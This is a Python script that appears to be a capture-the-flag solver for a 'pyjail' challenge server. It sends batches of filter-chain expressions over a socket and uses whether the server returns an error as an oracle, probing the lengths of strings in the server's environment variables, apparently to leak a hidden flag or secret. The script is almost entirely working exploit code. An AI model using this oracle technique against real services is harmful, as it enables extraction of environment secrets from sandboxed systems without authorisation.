import socket
import json
import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def query_batch_remote(exprs):
    s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    buf = b""
    while b"expr: " not in buf:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    if b"expr: " in buf:
        buf = buf.split(b"expr: ", 1)[1]
    
    payload = ("\n".join(exprs) + "\n").encode()
    s.sendall(payload)
    
    answers = []
    token_re = solve_remote_live.TOKEN_RE
    while len(answers) < len(exprs):
        matches = list(token_re.finditer(buf))
        if matches:
            take = min(len(matches), len(exprs) - len(answers))
            answers.extend(m.group(1).decode() for m in matches[:take])
            buf = buf[matches[take - 1].end() :]
            if len(answers) == len(exprs):
                break
            continue
        chunk = s.recv(65536)
        if not chunk:
            break
        buf += chunk
    s.close()
    return answers

if __name__ == "__main__":
    bases = [
        ("env|flatten|sort|last", "Last string in env|flatten"),
        ("env|flatten|sort|first", "First string in env|flatten"),
        ("env|values|flatten|sort|last", "Last string in env|values"),
    ]
    
    tested_lengths = sorted(CHAINS.keys())
    
    for base_expr, label in bases:
        print(f"\n[*] Testing target expression: {label} ({base_expr})")
        exprs = []
        for L in tested_lengths:
            pred = predicate(CHAINS[L])
            exprs.append(f"{base_expr}|length|{pred}|error")
        
        answers = query_batch_remote(exprs)
        matched_lengths = [L for L, ans in zip(tested_lengths, answers) if ans == "error"]
        print(f"[+] Matches for {label}: {matched_lengths}")
